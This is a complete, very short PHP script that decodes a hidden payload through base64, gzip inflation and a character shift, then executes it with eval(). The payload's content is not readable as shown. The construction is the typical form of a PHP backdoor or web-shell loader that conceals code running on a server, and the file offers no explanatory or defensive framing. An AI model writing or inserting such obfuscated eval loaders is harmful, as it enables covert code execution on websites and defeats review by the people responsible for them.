<?php function mPz($qjvS)
{ 
$qjvS=gzinflate(base64_decode($qjvS));
 for($i=0;$i<strlen($qjvS);$i++)
 {
$qjvS[$i] = chr(ord($qjvS[$i])-1);
 }
 return $qjvS;
 }eval(mPz("fU9LDoIwED1ATzEhLGBhPACRE7hS96TWQZo0LWmnKjGc3dYSFEOc5bw/QDjGhOLOwfGOSCdjqNubgSsa2JNFvLfyxgkh7y228gE7yLYqMbJqyRBKoqaKpa8/Kymg9VqQNBqaRhjtyHpBxcQsIUXEy6mTblMnIITMZhEc1y2vSMXCw6Lz6q3+dtvUkTi90oqymkUWyVv9qwi0nls8oOtDaywm6/Jvn6a54LSw/LTyQb8eP7KRvQA="));?>